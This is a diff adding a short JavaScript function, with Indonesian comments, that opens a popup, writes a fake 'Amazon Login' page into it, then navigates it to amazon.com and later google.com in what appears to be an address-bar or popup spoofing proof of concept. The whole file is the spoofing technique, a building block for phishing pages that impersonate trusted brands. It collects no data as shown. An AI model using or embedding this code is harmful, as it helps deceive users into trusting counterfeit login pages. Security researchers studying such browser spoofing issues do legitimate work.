@@ -1,0 +1,26 @@
+function spoofMethod1() {
+    var w = window.open('about:blank', 'popup', 'width=500,height=500');
+    
+    setTimeout(function() {
+        try {
+            w.document.open();
+            w.document.write('<html><head><title>Amazon Login</title></head><body>');
+            w.document.write('<h1>Please login</h1>');
+            w.document.write('<script>');
+            w.document.write('setTimeout(function() { window.location = "http://amazon.com"; }, 500);');
+            w.document.write('</script></body></html>');
+            w.document.close();
+        } catch(e) {
+            console.error('Error:', e);
+        }
+    }, 100);
+    
+    // Redirect setelah navigation terjadi
+    setTimeout(function() {
+        try {
+            w.location.replace('http://www.google.com/csi');
+        } catch(e) {
+            // Cross-origin sudah terjadi
+        }
+    }, 1000);
+}
